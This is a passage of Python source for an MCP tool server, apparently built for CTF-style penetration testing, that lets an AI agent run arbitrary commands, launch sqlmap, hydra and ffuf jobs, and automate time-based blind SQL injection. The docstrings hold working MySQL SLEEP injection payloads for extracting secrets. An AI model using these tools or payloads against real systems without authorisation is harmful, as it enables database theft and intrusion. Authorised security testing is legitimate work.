        Use this to record hypotheses, creds, interesting ports, next steps,
        or anything you'd otherwise forget as the session grows. Notes are
        stored in the local DB, so they survive across tool calls AND MCP
        restarts. Read them back with target_notes.
        """
        note = (note or "").strip()
        if not note:
            return {"error": "note is empty", "success": False}
        notes = await _ldb.append_note(target, note)
        console.print(f"[green]📝 Note saved for {target}[/]")
        return {"target": target, "success": True, "notes_tail": notes[-800:]}

    @mcp.tool(name="target_notes")
    async def target_notes(target: str) -> Dict:
        """Read the full persistent scratchpad for a target (see target_note_add).

        Call this before starting work on a target to reload everything you
        learned previously — the cheap way to resume a long engagement."""
        notes = await _ldb.get_notes(target)
        if notes:
            console.print(f"[cyan]📝 Notes for {target}:[/]\n[dim]{notes}[/]")
        else:
            console.print(f"[dim]No notes yet for {target} — use target_note_add to record progress.[/]")
        return {"target": target, "notes": notes}

    @mcp.tool(name="mission_state")
    async def mission_state(target: str = "") -> Dict:
        """ONE-CALL re-orientation snapshot for long engagements. Returns
        targets + profiles (ports, CVEs, notes), findings by severity,
        active background jobs, and live sessions — all compact.

        Args:
            target: Optional — restrict the summary to one target.

        RECOMMENDED RHYTHM: call mission_state at session start, and again
        after every major phase (recon → scan → exploit → post-exploit) or
        any time you feel lost. It costs one small call and rebuilds context
        without re-reading giant outputs.
        """
        state: Dict[str, Any] = {"targets": [], "findings_by_severity": {},
                                 "jobs": [], "sessions": []}

        # Targets (local DB = source of truth for profiles + notes)
        tgts = await _ldb.all_targets()
        if target:
            tgts = [t for t in tgts if t["host"] == target]
        for t in tgts[:20]:
            sev = await _ldb.counts_by_severity(t["host"])
            state["targets"].append({
                "host": t["host"],
                "os_guess": t.get("os_guess") or "",
                "open_ports": (t.get("open_ports") or "")[:300],
                "cves": (t.get("cves") or "")[:400],
                "notes_tail": (t.get("notes") or "")[-1500:],
                "findings_by_severity": sev,
            })

        # Findings (server DB = source of truth for findings)
        f_res = await client.get("/api/findings",
                                 **({} if not target else {"target": target}),
                                 **{"limit": 1, "offset": 0})
        if "error" not in f_res:
            state["findings_by_severity"] = f_res.get("counts_by_severity", {})
            state["total_findings"] = f_res.get("total", 0)

        # Background jobs (compact — just enough to know what's still cooking)
        j_res = await client.job_get("/api/scan/list")
        for j in (j_res.get("jobs") or [])[:10]:
            state["jobs"].append({
                "job_id": j.get("job_id"),
                "track": j.get("track") or "",
                "alive": j.get("alive"),
                "finished": j.get("finished"),
                "progress": (j.get("progress") or "")[:120],
                "elapsed_sec": j.get("elapsed_sec"),
            })

        # Live PTY sessions
        s_res = await client.get("/api/session/list")
        for s in (s_res.get("sessions") or [])[:15]:
            state["sessions"].append({
                "id": s.get("id"),
                "type": s.get("type"),
                "target": s.get("target"),
                "alive": s.get("alive"),
                "uptime_sec": s.get("uptime_sec"),
            })

        console.print("[bold cyan]🧭 Mission state snapshot[/]")
        for t in state["targets"]:
            console.print(f"  [cyan]{t['host']}[/] ports=[dim]{t['open_ports'][:120] or '?'}[/] "
                         f"findings={t['findings_by_severity'] or '{}'}")
        console.print(f"[dim]jobs: {len(state['jobs'])} | sessions: {len(state['sessions'])}[/]")
        return state

    @mcp.tool(name="scan_output")
    async def scan_output(job_id: str, offset_bytes: int = 0, max_bytes: int = 20000) -> Dict:
        """Page through a background job's FULL log in chunks (byte offsets).

        Use this AFTER scan_wait/scan_status to read the middle of a huge scan
        log that was windowed out (the response flags stdout_truncated=true).
        Read chunks of max_bytes (default 20KB), advancing offset_bytes to the
        returned next_offset, until finished=true.

        Args:
            job_id:       Job ID from scan_start()
            offset_bytes: Byte offset to start reading from (0 = start of log)
            max_bytes:    Chunk size (1KB..200KB)

        Example rhythm:
            r = scan_output(job_id, offset_bytes=0)      # first chunk
            r = scan_output(job_id, r['next_offset'])    # next chunk
        """
        result = await client.get(f"/api/scan/{job_id}/output",
                                  offset_bytes=offset_bytes, max_bytes=max_bytes)
        if "error" in result:
            console.print(f"[red]❌ scan_output: {result['error']}[/]")
            return result
        chunk = result.get("chunk", "")
        if chunk:
            lines = chunk.splitlines()
            console.print(f"[cyan]📄 {job_id} @{result.get('offset')}"
                         f"[/] ({result.get('total_bytes')}B total, "
                         f"[dim]{result.get('remaining_bytes')}B left[/])")
            console.print("\n".join(lines[:120]))
        else:
            console.print("[dim]End of log reached.[/]")
        return result

    @mcp.tool(name="clear_findings")
    async def clear_findings(target: Optional[str] = None, confirm: bool = False) -> Dict:
        """Clear findings for a target (or all targets if not specified).

        FIX (M2): destructive action now REQUIRES confirm=True — previously a
        stray call wiped the whole findings DB with no undo.
        """
        if not confirm:
            return {"cleared": False, "error": "confirm=True required (destructive, no undo)",
                    "hint": f"pass confirm=True to clear {'all findings' if not target else f'findings for {target}'}"}
        # Clear local DB
        await _ldb.clear(target)
        if target:
            # Clear specific target on server
            server_result = await client.delete(f"/api/targets/{_urlq(target)}")
            # FIX: check the actual server response before claiming success
            if "error" in server_result:
                console.print(f"[yellow]⚠️  Local DB cleared, but server clear failed: {server_result.get('error')}[/]")
            else:
                console.print(f"[green]✅ Cleared findings for target: {target}[/]")
            return server_result
        # FIX: Also clear all findings on server (not just local)
        server_result = await client.delete("/api/findings/clear")
        if "error" not in server_result:
            console.print(f"[green]✅ Cleared all findings from both local and server databases[/]")
        else:
            console.print(f"[yellow]⚠️  Local DB cleared, but server clear failed: {server_result.get('error')}[/]")
        return {"cleared": "all", "local": True, "server": server_result}

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # SERVER HEALTH
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="server_health")
    async def server_health() -> Dict:
        """Check Adara API server health and available tools."""
        result = await client.get("/health")
        if "error" in result:
            console.print(f"[red]❌ Server unreachable: {result['error']}[/]")
            return result

        t = Table(title="🔧 Adara Tool Status", box=box.SIMPLE_HEAD, header_style="bold cyan")
        t.add_column("Tool")
        t.add_column("Available", justify="center")
        for tool, avail in result.get("tools_status", {}).items():
            t.add_row(tool, "[green]✓[/]" if avail else "[red]✗[/]")
        console.print(t)
        return result

    @mcp.tool(name="execute_command")
    async def execute_command(command: str, timeout: int = 3600) -> Dict:
        """Execute an arbitrary command on the Adara server.

        Use for quick interactive commands. Output larger than ~90KB is
        auto-windowed (head+tail, flagged stdout_truncated=true) so it can't
        flood your context — for huge scans use scan_start() instead, then
        page results with scan_output()."""
        # FIX: redact the log line — scan_start('hydra -p hunter2 ...') landed
        # the plaintext password in the terminal log
        logger.info(f"Exec: {_redact_cmd(command)}")
        return await client.post("/api/command", {"command": command, "timeout": timeout})

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # BACKGROUND SCAN JOBS — kills the sqlmap/ffuf/nmap 300s timeout (-32001)
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="scan_start")
    async def scan_start(command: str, track: str = "", env: Optional[Dict[str, str]] = None) -> Dict:
        """
        Launch ANY shell command as a detached background job. Returns immediately
        with a job_id — never blocks long enough to hit the MCP -32001 timeout.

        This is the fix for: sqlmap --level=3 / --technique=S blind extraction,
        ffuf on big wordlists, slow nmap scans, hydra against large wordlists —
        anything that previously timed out at 300s.

        Progress is parsed from the log automatically:
          • sqlmap:  "char 14/32 blind extraction, last='4f'"
          • ffuf:    "5234/10432 (50.2%)"
          • hydra:   "842/1432 attempts"
          • gobuster: "12 dirs/files found"
          • nuclei:  "7 finding(s)"

        Args:
            command:  Full shell command (e.g. "sqlmap -u 'http://...' --level=3 --batch")
            track:    Tool hint for progress parsing. Auto-detected from command if empty.
            env:      Extra environment variables for the command.

        Returns:
            job_id, log_path, pid, track — use scan_status/scan_wait to follow.

        Example:
            r = scan_start("sqlmap -u 'http://10.10.10.5/login' --level=3 --batch")
            scan_status(r['job_id'])   # check progress
            scan_wait(r['job_id'])     # block until done (polls internally)
        """
        console.print(f"[bold yellow]🚀 Background scan:[/] {command[:80]}")
        result = await client.job_post("/api/scan/start",
                                        {"command": command, "track": track, "env": env or {}})
        if result.get("job_id"):
            console.print(f"[green]✅ Job started:[/] {result['job_id']} "
                         f"([dim]track={result.get('track','?')}[/])")
            console.print(f"[dim]Poll: scan_status('{result['job_id']}') or scan_wait('{result['job_id']}')[/]")
        else:
            console.print(f"[red]❌ Failed to start job: {result.get('error', result)}[/]")
        return result

    @mcp.tool(name="scan_status")
    async def scan_status(job_id: str, tail_lines: int = 50) -> Dict:
        """
        Get live status + parsed progress + log tail for a background job.

        THIS IS THE DIAGNOSTIC SURFACE — it tells you exactly what was running
        when you check (e.g. 'sqlmap: char 14/32 blind extraction, last=4f',
        'ffuf: 5234/10432 (50.2%)'), plus the last chunk of raw output.
        For the middle of a huge finished log, use scan_output() to page it.

        Args:
            job_id:      Job ID from scan_start()
            tail_lines:  How many log lines to show in the console preview.

        Returns:
            alive, exit_code, elapsed_sec, progress, tail, finished
        """
        # FIX: tail_lines now controls the server-side tail_bytes too, so the
        # returned payload matches the requested preview instead of always
        # carrying up to 4KB of raw tail.
        result = await client.job_get(f"/api/scan/{job_id}/status",
                                      tail_bytes=max(int(tail_lines) * 80, 1024))
        if "error" in result:
            console.print(f"[red]❌ scan_status: {result['error']}[/]")
            return result
        alive = "[green]ALIVE[/]" if result.get("alive") else "[red]done/dead[/]"
        prog = result.get("progress", "no output")
        console.print(f"[cyan]📊 {job_id}[/]: {alive} | {result.get('elapsed_sec','?')}s | "
                     f"[yellow]{prog}[/]")
        tail = result.get("tail", "")
        if tail:
            lines = tail.splitlines()
            preview = "\n".join(lines[-tail_lines:]) if tail_lines else tail
            console.print(f"[dim]{preview}[/]")
        return result

    @mcp.tool(name="scan_wait")
    async def scan_wait(job_id: str, timeout: int = 600, poll_interval: int = 3) -> Dict:
        """
        Block until the job finishes OR `timeout` elapses — whichever first.
        Polls the status endpoint in short bursts with a GROWING interval, so
        no single HTTP connection is ever held open (that's what let the MCP
        client's -32001 'Request timed out' kill waiting calls mid-wait).
        Returns the finished output windowed (head+tail) — if the job produced
        a huge log the response flags stdout_truncated=true and you page the
        rest with scan_output(job_id, offset_bytes=...).

        Args:
            job_id:        Job ID from scan_start()
            timeout:       Max seconds to wait (default 600). The wait budget
                           auto-extends in real time for as long as the job is
                           making progress, so slow scans keep getting more time
                           instead of erroring out.
            poll_interval: Starting seconds between status checks (default 3;
                           grows up to 15s for long-running jobs).
        """
        timeout = max(1, min(int(timeout), 3600))
        poll_interval = max(1, min(int(poll_interval), 60))
        console.print(f"[cyan]⏳ Waiting for {job_id} (up to {timeout}s)...[/]")
        deadline = time.time() + timeout
        interval = poll_interval
        last: Dict = {}
        while time.time() < deadline:
            st = await client.job_get(f"/api/scan/{job_id}/status", tail_bytes=4096)
            if "error" in st:
                console.print(f"[red]❌ scan_wait: {st['error']}[/]")
                return st
            last = st
            if st.get("finished"):
                break
            # Dynamic interval: back off as the job runs longer (less spam,
            # still 'real-time' for quick jobs) and give it more time to finish.
            elapsed = st.get("elapsed_sec") or 0
            if elapsed > 240:
                interval = min(max(interval, max(poll_interval * 2, 10)), 2 * 30)
            elif elapsed > 60:
                interval = min(interval + 1, 15)
            else:
                interval = poll_interval
            await asyncio.sleep(interval)
        if not last:
            return {"job_id": job_id, "error": "no status received", "finished": False}
        if last.get("finished"):
            # Collect the windowed full output via /wait (short call, job done)
            result = await client.job_post(f"/api/scan/{job_id}/wait",
                                           {"timeout": 60, "poll_interval": 1})
            if "error" not in result and result.get("stdout"):
                console.print(f"[green]✅ Job {job_id} finished[/] "
                              f"(exit={result.get('exit_code')}, {result.get('elapsed_sec','?')}s)")
                console.print(f"[dim]{result['stdout'][:1500]}[/]")
                if result.get("stdout_truncated"):
                    console.print("[yellow]⚠️  Log was huge — windowed. "
                                  f"Page the rest: scan_output('{job_id}', 0)[/]")
            return result
        console.print(f"[yellow]⏳ Still running after {timeout}s — "
                      f"progress: {last.get('progress', '?')}[/]")
        console.print(f"[dim]Job {job_id} is going strong — call scan_wait('{job_id}') "
                      "again (or moved on) to keep tracking it.[/]")
        return {**last, "finished": False,
                "note": "Job still running — call scan_wait again for more time."}

    @mcp.tool(name="scan_list")
    async def scan_list() -> Dict:
        """List all background scan jobs (active + finished) with parsed progress."""
        result = await client.job_get("/api/scan/list")
        jobs = result.get("jobs", [])
        if jobs:
            t = Table(title="🚀 Background Jobs", box=box.ROUNDED,
                      title_style="bold yellow", header_style="bold cyan", show_lines=True)
            t.add_column("Job ID", style="cyan")
            t.add_column("Track", style="dim")
            t.add_column("Status", justify="center")
            t.add_column("Elapsed", justify="right")
            t.add_column("Progress", max_width=50)
            for j in jobs:
                if j.get("alive"):
                    status = "[green]RUNNING[/]"
                elif j.get("finished"):
                    status = "[dim]done[/]"
                else:
                    status = "[yellow]unknown[/]"
                t.add_row(j.get("job_id", ""), j.get("track", ""), status,
                          f"{j.get('elapsed_sec','?')}s", j.get("progress", "—"))
            console.print(t)
        else:
            console.print("[dim]No background jobs[/]")
        return result

    @mcp.tool(name="scan_kill")
    async def scan_kill(job_id: str) -> Dict:
        """Kill a running background job and mark it finished."""
        result = await client.job_delete(f"/api/scan/{job_id}")
        if result.get("killed"):
            console.print(f"[red]🛑 Killed job {job_id}[/]")
        elif "error" in result:
            console.print(f"[red]❌ scan_kill: {result['error']}[/]")
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # TIME-BASED BLIND SQLi EXTRACTION
    # Server-side binary search — one MCP call returns the full string
    # (replaces ~224 manual curl/SLEEP round-trips).
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="blind_extract")
    async def blind_extract(
        url: str,
        payload_template: str,
        sleep: float = 0.5,
        start_pos: int = 1,
        end_pos: int = 32,
        char_min: int = 32,
        char_max: int = 126,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        data: str = "",
        concurrency: int = 4,
        length_payload: str = "",
        max_len: int = 256,
        true_threshold: float = 1.5,
        max_retries: int = 2,
        request_timeout: float = 30.0,
        stop_on_no_trigger: bool = True,
        save_target: str = "",
    ) -> Dict:
        """
        Extract a string via time-based blind SQLi using SLEEP-based binary search.

        Runs the binary search SERVER-SIDE so one call returns the full extracted
        string — instead of ~224 manual curl/SLEEP round-trips per flag.

        IMPORTANT: end_pos=32 default silently stops longer strings — if the
        extracted result ends mid-string or looks cut off, re-run with
        end_pos=64/128 or a length_payload. On jittery links raise sleep to
        1-2s and true_threshold to 2-3 to avoid false triggers.

        payload_template MUST contain {pos} (1-indexed char position) and {val}
        (the ASCII comparison threshold). {sleep} is auto-filled from the `sleep`
        param. The condition is treated as TRUE when the request takes
        >= baseline + sleep*(true_threshold-1) seconds (the SLEEP fired →
        ASCII(char) > val); the baseline is measured per-run with a
        zeroed-sleep probe so slow networks can't false-negative everything.

        Args:
            url:               Target URL with the injectable parameter.
            payload_template:  The injection payload. MUST contain {pos} and {val}.
                               Example (MySQL, GET):
                                 "id=1' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets),{pos},1))>{val},SLEEP({sleep}),0)-- -"
                               Example (POST body):
                                 "user=admin' AND IF(ASCII(SUBSTRING((SELECT...),{pos},1))>{val},SLEEP({sleep}),0)-- -"
            sleep:             SLEEP seconds injected by the payload (default 0.5).
            start_pos:         First character position to extract (1-indexed).
            end_pos:           Last position to attempt (default 32). Ignored if
                               length_payload is set.
            char_min/char_max: ASCII range to search (default 32..126 = printable).
            method:            GET or POST (default GET).
            headers:           Extra HTTP headers (e.g. {"X-Forwarded-For": "..."}).
            data:              Extra POST body content merged with the rendered payload.
            concurrency:       Parallel character positions (default 4).
            length_payload:    Optional payload to binary-search the string length
                               first (overrides end_pos). Same {pos}/{val}/{sleep} format,
                               e.g. "id=1' AND IF(LENGTH((SELECT flag...))>{val},SLEEP({sleep}),0)-- -"
            max_len:           Upper bound for length search (default 256).
            true_threshold:    Multiplier: elapsed >= sleep*this ⇒ condition true (default 1.5).
            max_retries:       Retries per request on network error (default 2).
            request_timeout:   Per-HTTP-request timeout (default 30s).
            stop_on_no_trigger: Stop at first position that never triggers (past EOS).
            save_target:       If set, save the extracted string as a finding for this target.

        Returns:
            extracted (the string), length, positions_scanned, requests_made,
            elapsed_sec, per_position [{pos, code, char}].

        Example:
            blind_extract(
                url="http://10.10.10.5/login",
                payload_template="user=admin' AND IF(ASCII(SUBSTRING((SELECT flag FROM sqhell_4.flag),{pos},1))>{val},SLEEP({sleep}),0)-- -",
                method="POST", sleep=0.5, end_pos=40,
                save_target="10.10.10.5",
            )
        """
        # FIX (L10): char bounds must be sane or chr() blows up in the table
        # and the server's ASCII binary search goes nonsense for non-ASCII.
        char_min = max(0, min(int(char_min), 127))
        char_max = max(0, min(int(char_max), 127))
        if char_min > char_max:
            char_min, char_max = char_max, char_min
        # FIX (M5c): mirror the server-side guardrails client-side so the
        # SLEEP-hammer tool can't self-DoS (end_pos=10^6 built ~1M tasks
        # server-side; concurrency=100k = 100k parallel SLEEP requests).
        start_pos = max(1, int(start_pos))
        end_pos = min(max(int(end_pos), start_pos), 1024)
        max_len = max(1, min(int(max_len), 1024))
        concurrency = max(1, min(int(concurrency), 64))
        max_retries = max(0, min(int(max_retries), 10))
        sleep = max(0.05, min(float(sleep), 60.0))
        true_threshold = max(1.05, min(float(true_threshold), 10.0))
        request_timeout = max(1, min(float(request_timeout), 300.0))
        console.print(f"[bold magenta]🔜 Blind extraction:[/] {url}")
        console.print(f"[dim]sleep={sleep}s  pos={start_pos}..{end_pos}  "
                     f"chars={chr(char_min)}..{chr(char_max)}  concurrency={concurrency}[/]")
        result = await client.post("/api/tools/blind_extract", {
            "url": url, "payload_template": payload_template,
            "sleep": sleep, "start_pos": start_pos, "end_pos": end_pos,
            "char_min": char_min, "char_max": char_max,
            "method": method, "headers": headers or {}, "data": data,
            "concurrency": concurrency, "length_payload": length_payload,
            "max_len": max_len, "true_threshold": true_threshold,
            "max_retries": max_retries, "request_timeout": request_timeout,
            "stop_on_no_trigger": stop_on_no_trigger,
        })
        if "error" in result:
            console.print(f"[red]❌ blind_extract failed: {result['error']}[/]")
            return result

        extracted = result.get("extracted", "")
        n_req = result.get("requests_made", 0)
        elapsed = result.get("elapsed_sec", 0)
        console.print(f"[bold green]✅ Extracted ({n_req} requests, {elapsed}s):[/]")
        console.print(f"[bold yellow]{extracted}[/]")

        # Per-position table
        pp = result.get("per_position", [])
        if pp:
            t = Table(title="Per-position breakdown", box=box.SIMPLE_HEAD,
                      header_style="bold cyan")
            t.add_column("Pos", style="dim")
            t.add_column("Code")
            t.add_column("Char", style="yellow")
            for r in pp[:60]:
                t.add_row(str(r.get("pos", "")), str(r.get("code", "")),
                          r.get("char") or "?")
            console.print(t)

        # Auto-save as finding
        if save_target and extracted:
            await _ldb.save(save_target, "blind_extract", "creds",
                      f"Extracted via blind SQLi: {extracted[:40]}",
                      detail=extracted, severity="critical",
                      scan_command=f"blind_extract({url}, sleep={sleep})")
            console.print(f"[green]💾 Saved as critical finding for {save_target}[/]")

        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # REQUEST TEMPLATES — save crafted requests for replay
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="request_template_save")
    async def request_template_save(name: str, url: str = "", method: str = "GET",
                                    headers: Optional[Dict[str, str]] = None,
                                    data: str = "", additional_args: str = "-sk") -> Dict:
        """
        Save a named HTTP request template for later replay.

        Useful for injection points you had to discover manually (e.g.
        X-Forwarded-For) so you don't have to squeeze --headers into every call.

        Args:
            name:            Template name (unique key, upserts).
            url:             Target URL.
            method:          HTTP method (GET/POST/...).
            headers:         Header dict, e.g. {"X-Forwarded-For": "10.48.169.178*"}.
            data:            POST body.
            additional_args: Extra curl flags (default '-sk').

        Example:
            request_template_save(
                name="xff_sqli",
                url="http://10.10.10.5/login",
                headers={"X-Forwarded-For": "10.48.169.178*"},
            )
            # Later: request_template_run("xff_sqli")
        """
        result = await client.post("/api/templates/save", {
            "name": name, "url": url, "method": method,
            "headers": headers or {}, "data": data, "additional_args": additional_args,
        })
        if result.get("saved"):
            console.print(f"[green]💾 Template saved:[/] {name} ({method} {url})")
        elif "error" in result:
            console.print(f"[red]❌ Save failed: {result['error']}[/]")
        return result

    @mcp.tool(name="request_template_list")
    async def request_template_list() -> Dict:
        """List all saved request templates."""
        result = await client.get("/api/templates")
        templates = result.get("templates", [])
        if templates:
            t = Table(title="📋 Request Templates", box=box.SIMPLE_HEAD,
                      header_style="bold cyan")
            t.add_column("Name", style="yellow")
            t.add_column("Method")
            t.add_column("URL")
            t.add_column("Updated", style="dim")
            for tpl in templates:
                t.add_row(tpl.get("name", ""), tpl.get("method", ""),
                          tpl.get("url", ""), tpl.get("updated_at", "")[:16])
            console.print(t)
        else:
            console.print("[dim]No request templates saved[/]")
        return result

    @mcp.tool(name="request_template_get")
    async def request_template_get(name: str) -> Dict:
        """Get one saved request template by name (shows full headers/data)."""
        # FIX: template names are free-form agent strings — '/' or '?' in the
        # name hit a different server endpoint (the _urlq fix covered only
        # target/host paths)
        result = await client.get(f"/api/templates/{_urlq(name)}")
        if "error" in result:
            console.print(f"[red]❌ {result['error']}[/]")
            return result
        tpl = result.get("template", {})
        if tpl:
            console.print(Panel(
                f"[cyan]Name:[/]    {tpl.get('name','?')}\n"
                f"[cyan]Method:[/]  {tpl.get('method','GET')}\n"
                f"[cyan]URL:[/]     {tpl.get('url','')}\n"
                f"[cyan]Data:[/]    {tpl.get('data','') or '(none)'}\n"
                f"[cyan]Args:[/]    {tpl.get('additional_args','-sk')}\n"
                f"[cyan]Headers:[/] {json.dumps(tpl.get('headers', {}), indent=2)}",
                title=f"📋 {name}", border_style="cyan"))
        return result

    @mcp.tool(name="request_template_run")
    async def request_template_run(name: str, url: str = "", method: str = "",
                                   headers: Optional[Dict[str, str]] = None,
                                   data: str = "", additional_args: str = "",
                                   encode_url: bool = False) -> Dict:
        """
        Replay a saved request template. Any provided arg overrides the saved value.

        Args:
            name:            Template to replay.
            url/method/headers/data/additional_args: Override the saved values
                            (empty/unset means use the saved value).
            encode_url:      If True, percent-encode unsafe chars in the URL.

        Returns:
            The curl result + the resolved (merged) request that was actually sent.
        """
        overrides = {"encode_url": encode_url}
        if url: overrides["url"] = url
        if method: overrides["method"] = method
        if headers is not None: overrides["headers"] = headers
        if data: overrides["data"] = data
        if additional_args: overrides["additional_args"] = additional_args
        result = await client.post(f"/api/templates/{_urlq(name)}/run", overrides)
        if "error" in result:
            console.print(f"[red]❌ Run failed: {result['error']}[/]")
            return result
        resolved = result.get("resolved_request", {})
        console.print(f"[cyan]▶ Replayed '{name}':[/] {resolved.get('method','GET')} "
                     f"{resolved.get('url','')}")
        if result.get("stdout"):
            console.print(f"[dim]{result['stdout'][:1000]}[/]")
        return result

    @mcp.tool(name="request_template_delete")
    async def request_template_delete(name: str) -> Dict:
        """Delete a saved request template."""
        result = await client.delete(f"/api/templates/{_urlq(name)}")
        if result.get("deleted"):
            console.print(f"[green]🗑️  Deleted template '{name}'[/]")
        elif "error" in result:
            console.print(f"[red]❌ Delete failed: {result['error']}[/]")
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # FINDINGS MANAGEMENT — Status, Report, Analysis History
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="finding_status")
    async def finding_status(finding_id: int, status: str) -> Dict:
        """
        Update the status of a finding (workflow tracking).

        Args:
            finding_id: The finding ID to update
            status: New status — 'new', 'confirmed', 'false_positive', 'remediated'

        Returns:
            Updated finding status
        """
        # Update server status; FIX: local DB ids are a separate AUTOINCREMENT
        # sequence, so the old code updated the WRONG local row (or silently none).
        # Local status now syncs from the server on the next findings sync.
        # FIX: whitelist the status client-side — arbitrary strings were stored
        # (the server may or may not validate; don't rely on it)
        status = (status or "").strip().lower()
        if status not in ("new", "confirmed", "false_positive", "remediated"):
            return {"error": f"invalid status: {status!r} (new/confirmed/false_positive/remediated)", "updated": False}
        result = await client.post("/api/findings/status", {
            "finding_id": finding_id, "status": status
        })
        if "error" in result:
            console.print(f"[red]❌ Server status update failed: {result['error']}[/]")
            return result

        status_colors = {
            "new": "cyan", "confirmed": "green",
            "false_positive": "yellow", "remediated": "dim"
        }
        color = status_colors.get(status, "white")
        console.print(f"[bold]Finding #{finding_id}[/] → [{color}]{status}[/]")
        return {"finding_id": finding_id, "status": status, "updated": True}

    @mcp.tool(name="generate_report")
    async def generate_report(target: str = "", format: str = "json") -> Dict:
        """
        Generate a comprehensive pentest report with severity breakdown.

        IMPORTANT: 'json' returns ALL findings raw and can be large. For a
        context-safe overview use format='summary' first, then drill into
        specific targets/findings.

        Args:
            target: Optional — filter report to specific target
            format: Output format — 'json' (default), 'markdown', 'summary'

        Returns:
            Report with severity/status/tool breakdowns and all findings
        """
        report = await client.get("/api/report", target=target or None, fmt=format)

        # Display summary table
        t = Table(title=f"📊 Pentest Report {f'— {target}' if target else ''}",
                  box=box.ROUNDED, header_style="bold cyan")
        t.add_column("Metric", style="yellow")
        t.add_column("Value", justify="right")

        t.add_row("Total Findings", str(report.get("total_findings", 0)))
        sev = report.get("severity_breakdown", {})
        t.add_row("Critical", f"[bold red]{sev.get('critical', 0)}[/]")
        t.add_row("High", f"[red]{sev.get('high', 0)}[/]")
        t.add_row("Medium", f"[yellow]{sev.get('medium', 0)}[/]")
        t.add_row("Low", f"[cyan]{sev.get('low', 0)}[/]")
        t.add_row("Info", f"[dim]{sev.get('info', 0)}[/]")

        status_b = report.get("status_breakdown", {})
        for st, cnt in status_b.items():
            t.add_row(f"Status: {st}", str(cnt))

        console.print(t)

        # Tool breakdown
        tool_b = report.get("tool_breakdown", {})
        if tool_b:
            tt = Table(title="Tool Usage", box=box.SIMPLE)
            tt.add_column("Tool", style="cyan")
            tt.add_column("Findings", justify="right")
            for tool, cnt in sorted(tool_b.items(), key=lambda x: -x[1]):
                tt.add_row(tool, str(cnt))
            console.print(tt)

        return report

    @mcp.tool(name="analysis_history")
    async def analysis_history(target: str, limit: int = 5) -> Dict:
        """
        Get the history of smart_analyze runs for a target.
        Shows how the target profile evolved over time.

        Args:
            target: IP or hostname
            limit: Max number of past analyses to return

        Returns:
            List of past analyses with delta information
        """
        # FIX: limit was unclamped AND each row carried the full analysis_json
        # (cve_enrichment + poc_repos blobs, 30-60KB/row) — analysis_history(t,100)
        # dumped 3-6MB into agent context. Clamp to 10 and collapse each row to
        # its summary columns.
        limit = max(1, min(int(limit), 10))
        result = await client.get(f"/api/analyses/{_urlq(target)}", limit=limit)
        analyses = result.get("analyses", [])

        if not analyses:
            console.print(f"[dim]No analysis history for {target}[/]")
            return {"target": target, "analyses": []}

        compact = []
        for a in analyses:
            aj = a.get("analysis_json") or {}
            if not isinstance(aj, dict):
                aj = {}
            compact.append({
                "id": a.get("id"),
                "created_at": (a.get("created_at") or "?")[:19],
                "finding_count": a.get("finding_count", 0),
                "cve_count": a.get("cve_count", 0),
                "os_guess": aj.get("os_guess", "Unknown"),
                "ports": (aj.get("ports") or [])[:20],
                "services": (aj.get("services") or [])[:20],
                "cves": (aj.get("cves") or [])[:20],
                "cves_total": len(aj.get("cves") or []),
                "delta": a.get("delta_json") or {},
            })
        analyses = compact
        # FIX: delta_json can arrive as a raw JSON string (mirrors the aj guard
        # above); .get() on a str would AttributeError in the table render
        for _a in analyses:
            if not isinstance(_a.get("delta"), dict):
                _a["delta"] = {}

        if not analyses:
            console.print(f"[dim]No analysis history for {target}[/]")
            return {"target": target, "analyses": []}

        t = Table(title=f"📜 Analysis History — {target}", box=box.SIMPLE_HEAD,
                  header_style="bold cyan")
        t.add_column("#", width=3)
        t.add_column("Date", width=20)
        t.add_column("Findings", justify="right")
        t.add_column("CVEs", justify="right")
        t.add_column("Delta")

        for i, a in enumerate(analyses, 1):
            # FIX: compact rows carry the key "delta" (was "delta_json" — the
            # delta column rendered "—" for every row)
            delta = a.get("delta", {})
            delta_str = ""
            if delta:
                parts = []
                if delta.get("new_findings"): parts.append(f"+{delta['new_findings']} findings")
                if delta.get("new_cves"): parts.append(f"+{len(delta['new_cves'])} CVEs")
                if delta.get("new_ports"): parts.append(f"+{len(delta['new_ports'])} ports")
                delta_str = ", ".join(parts) if parts else "—"

            t.add_row(
                str(i),
                a.get("created_at", "?")[:19],
                str(a.get("finding_count", 0)),
                str(a.get("cve_count", 0)),
                delta_str or "—",
            )
        console.print(t)
        return {"target": target, "analyses": analyses}

    @mcp.tool(name="save_finding")
    async def save_finding_manual(
        target: str, tool: str, title: str,
        category: str = "info", detail: str = "",
        severity: str = "info", raw_output: str = "",
        scan_command: str = ""
    ) -> Dict:
        """
        Manually save a finding to both server and local databases.
        Deduplication is automatic via content hashing.

        Args:
            target: Target IP/hostname
            tool: Tool name
            title: Finding title
            category: Category (scan, web, creds, vuln, etc.)
            detail: Detailed description
            severity: Severity level (info, low, medium, high, critical)
            raw_output: Raw tool output
            scan_command: The command that produced this finding

        Returns:
            Saved finding ID and dedup status
        """
        # FIX: cap raw_output client-side at 1MB — unbounded evidence blobs
        # bloated both DBs (a stray 'cat /dev/urandom > file' paste = GBs).
        # Server auto-tiers bodies >256KB into finding_blobs, so ~1MB still
        # moves cleanly; this guard just stops pathological pastes entirely.
        if raw_output and len(raw_output) > 1_000_000:
            raw_output = raw_output[:1_000_000] + "\n...[truncated]"
        if detail and len(detail) > 100_000:
            detail = detail[:100_000] + "\n...[truncated]"
        result = await client.post("/api/findings/save", {
            "target": target, "tool": tool, "category": category,
            "title": title, "detail": detail, "severity": severity,
            "raw_output": raw_output, "scan_command": scan_command,
        })
        # Also save locally
        await _ldb.save(target, tool, category, title, detail, severity,
                        raw_output=raw_output, scan_command=scan_command)

        if result.get("duplicate"):
            console.print(f"[yellow]Finding already exists (dedup)[/]")
        else:
